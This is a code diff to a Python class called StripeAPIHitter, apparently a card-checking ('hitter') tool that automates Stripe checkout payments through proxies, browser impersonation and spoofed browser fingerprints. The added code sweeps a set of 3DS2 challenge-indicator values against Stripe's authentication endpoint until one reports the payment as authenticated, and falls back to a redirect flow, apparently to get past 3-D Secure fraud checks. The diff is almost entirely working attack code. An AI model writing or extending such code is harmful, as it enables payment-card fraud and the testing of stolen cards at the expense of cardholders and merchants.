@@ -1319,6 +1319,8 @@ class StripeAPIHitter:
                 pm_headers["sec-fetch-mode"] = "cors"
                 pm_headers["sec-fetch-dest"] = "empty"
                 pm_headers["referer"] = checkout_page_url
+                if self.stripe_account:
+                    pm_headers["Stripe-Account"] = self.stripe_account
                 # Use persistent session — stripe_mid cookies from warmup flow into tokenization
                 pm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(pm_url, headers=pm_headers, data=pm_data, timeout=30))
                 pm_json = pm_res.json()
@@ -1407,6 +1409,8 @@ class StripeAPIHitter:
                 confirm_headers["sec-fetch-mode"] = "cors"
                 confirm_headers["sec-fetch-dest"] = "empty"
                 confirm_headers["referer"] = checkout_page_url
+                if self.stripe_account:
+                    confirm_headers["Stripe-Account"] = self.stripe_account
                 # Use persistent session — cookies from warmup + elements session propagate to confirm
                 confirm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(confirm_url, headers=confirm_headers, data=confirm_data, timeout=30))
                 confirm_json = confirm_res.json()
@@ -1831,24 +1835,110 @@ class StripeAPIHitter:
                                 )
                                 processed_auth = False
 
-                                if is_legacy_3ds or source:
-                                    # APP (3).PY DIRECT REDIRECT FLOW
-                                    redirect_url = confirm_json.get("url") or sdk.get("stripe_js") or (next_action.get("redirect_to_url") or {}).get("url")
-                                    if isinstance(redirect_url, str) and redirect_url:
-                                        redir_headers = {
-                                            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-                                            "user-agent": profile["user_agent"]
-                                        }
+                                if source:
+                                    # STAGE 1: 3DS2 EMV Exemption Matrix Sweep (01, 04, 05, 02, U/01, N/03)
+                                    auth_headers = {
+                                        "accept": "application/json",
+                                        "content-type": "application/x-www-form-urlencoded",
+                                        "origin": "https://js.stripe.com",
+                                        "referer": "https://js.stripe.com/",
+                                        "user-agent": profile["user_agent"]
+                                    }
+                                    if self.stripe_account:
+                                        auth_headers["Stripe-Account"] = self.stripe_account
+                                    
+                                    _tds_server_trans_id = None
+                                    _source_obj = sdk.get("three_d_secure_2_source_object") or {}
+                                    if isinstance(_source_obj, dict):
+                                        _tds_server_trans_id = _source_obj.get("three_d_secure_2", {}).get("three_d_secure_server_transaction_id")
+                                    if not _tds_server_trans_id:
+                                        _tds_server_trans_id = sdk.get("server_transaction_id") or sdk.get("three_ds_server_trans_id")
+
+                                    _method_url = sdk.get("three_ds_method_url")
+                                    if _method_url and _tds_server_trans_id:
                                         try:
-                                            await loop.run_in_executor(None, lambda: cffi_requests.get(redirect_url, headers=redir_headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
+                                            import base64 as _b64
+                                            _m_data = json.dumps({
+                                                "threeDSServerTransID": _tds_server_trans_id,
+                                                "threeDSMethodNotificationURL": "https://hooks.stripe.com/3ds2/method_response"
+                                            }).encode()
+                                            _m_b64 = _b64.b64encode(_m_data).decode().rstrip('=').replace('+', '-').replace('/', '_')
+                                            _m_headers = {
+                                                "content-type": "application/x-www-form-urlencoded",
+                                                "user-agent": profile["user_agent"]
+                                            }
+                                            await loop.run_in_executor(None, lambda: cffi_requests.post(
+                                                _method_url, data={"threeDSMethodData": _m_b64},
+                                                headers=_m_headers, proxies=proxies, timeout=10,
+                                                impersonate=profile["impersonate"]))
                                         except Exception:
                                             pass
-                                    processed_auth = True
-                                else:
-                                    result['decline_code'] = 'no_3ds_source'
-                                    result['error'] = f'3DS required but no source or redirect URL found'
-                                    result['raw_response'] = confirm_json
-                                    return result
+
+                                    auth_variations = [
+                                        {"threeDSCompInd": "Y", "threeDSRequestorChallengeInd": "01", "fingerprintAttempted": True},
+                                        {"threeDSCompInd": "Y", "threeDSRequestorChallengeInd": "04", "fingerprintAttempted": True},
+                                        {"threeDSCompInd": "Y", "threeDSRequestorChallengeInd": "05", "fingerprintAttempted": True},
+                                        {"threeDSCompInd": "Y", "threeDSRequestorChallengeInd": "02", "fingerprintAttempted": True},
+                                        {"threeDSCompInd": "U", "threeDSRequestorChallengeInd": "01", "fingerprintAttempted": True},
+                                        {"threeDSCompInd": "N", "threeDSRequestorChallengeInd": "03", "fingerprintAttempted": False}
+                                    ]
+                                    
+                                    for var in auth_variations:
+                                        browser = {
+                                            "fingerprintAttempted": var["fingerprintAttempted"],
+                                            "fingerprintData": None,
+                                            "challengeWindowSize": "05",
+                                            "threeDSCompInd": var["threeDSCompInd"],
+                                            "threeDSRequestorChallengeInd": var["threeDSRequestorChallengeInd"],
+                                            "browserJavaEnabled": False,
+                                            "browserJavascriptEnabled": True,
+                                            "browserLanguage": locale,
+                                            "browserColorDepth": profile.get("color_depth", "24"),
+                                            "browserScreenHeight": profile.get("screen_height", "1080"),
+                                            "browserScreenWidth": profile.get("screen_width", "1920"),
+                                            "browserTZ": str(tz_id) if isinstance(tz_id, int) else "-300",
+                                            "browserUserAgent": auth_headers["user-agent"]
+                                        }
+                                        auth_url = "https://api.stripe.com/v1/3ds2/authenticate"
+                                        auth_data = {
+                                            "source": source,
+                                            "browser": json.dumps(browser),
+                                            "threeDSCompInd": var["threeDSCompInd"],
+                                            "one_click_authn_device_support[hosted]": "false",
+                                            "one_click_authn_device_support[same_origin_frame]": "false",
+                                            "one_click_authn_device_support[spc_eligible]": "false",
+                                            "one_click_authn_device_support[webauthn_eligible]": "false",
+                                            "one_click_authn_device_support[publickey_credentials_get_allowed]": "true",
+                                            "key": pk
+                                        }
+                                        if _tds_server_trans_id:
+                                            auth_data["three_ds_server_trans_id"] = _tds_server_trans_id
+                                        try:
+                                            auth_resp_raw = await loop.run_in_executor(None, lambda data=auth_data: cffi_requests.post(
+                                                auth_url, headers=auth_headers, data=data,
+                                                proxies=proxies, timeout=25, impersonate=profile["impersonate"]))
+                                            auth_json = auth_resp_raw.json()
+                                            state = auth_json.get("state")
+                                            ares = auth_json.get("ares", {}) or {}
+                                            trans_status = ares.get("transStatus")
+                                            if state in ["succeeded", "authenticated"] or trans_status in ["Y", "A"]:
+                                                state = "authenticated"
+                                                break
+                                        except Exception:
+                                            continue
+
+                                # STAGE 2: Web Redirect Fallback (app (3).py method)
+                                redirect_url = confirm_json.get("url") or sdk.get("stripe_js") or (next_action.get("redirect_to_url") or {}).get("url")
+                                if isinstance(redirect_url, str) and redirect_url:
+                                    redir_headers = {
+                                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+                                        "user-agent": profile["user_agent"]
+                                    }
+                                    try:
+                                        await loop.run_in_executor(None, lambda: cffi_requests.get(redirect_url, headers=redir_headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
+                                    except Exception:
+                                        pass
+                                processed_auth = True
 
                                 if processed_auth:
                                     is_setup = is_setup_intent or (isinstance(pi, str) and 'seti' in pi)
